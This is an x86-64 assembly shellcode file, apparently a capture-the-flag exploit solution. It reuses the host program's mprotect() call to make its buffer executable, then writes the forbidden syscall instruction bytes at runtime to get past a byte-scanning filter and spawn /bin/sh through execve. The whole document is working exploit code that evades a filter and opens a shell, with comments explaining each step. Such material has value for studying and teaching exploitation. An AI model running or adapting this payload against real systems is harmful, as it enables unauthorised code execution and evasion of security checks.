.section .text
.globl _start

_start:
    # ----------------
    # First invocation
    # ----------------

    # check whether this is the second invocation and if not, mark it as the first
    cmp $0x01, %rbx
    je shell
    mov $0x01, %rbx

    # set arguments for mprotect(addr, len, prot)
    mov %rdx, %rdi     # addr = buffer
    mov $0x64, %esi    # len = 100
    mov $0x07, %edx    # prot = PROT_READ | PROT_WRITE | PROT_EXEC

    # recover the return address pushed by call *%rdx, then step back 0x10 bytes to reach the mprotect() call in main()
    pop %r10
    sub $0x10, %r10
    jmp *%r10

shell:
    # -----------------
    # Second invocation
    # -----------------

    # with the buffer now RWX, construct the forbidden 0x0f 0x05 ("syscall") instruction at runtime, bypassing forbidden()'s byte check
    mov $0x0e, %al
    add $0x01, %al
    mov $0x05, %ah

    # replace the existing benign bytes in syscall_instruction with 0x0f 0x05
    lea syscall_instruction(%rip), %r10
    mov %ax, (%r10)

    # prepare execve(pathname, argv, envp) and execute
    lea binsh(%rip), %rdi    # pathname = "/bin/sh"
    xor %esi, %esi           # argv = NULL
    xor %edx, %edx           # envp = NULL
    mov $0x3B, %eax          # Linux x86-64 syscall number for execve
    jmp syscall_instruction

# initially benign bytes; replaced with 0x0f 0x05 at runtime after forbidden() scan
syscall_instruction:
    .byte 0x00, 0x00

# null-terminated "/bin/sh" string used by execve()
binsh:
    .ascii "/bin/sh"
    .byte 0x00
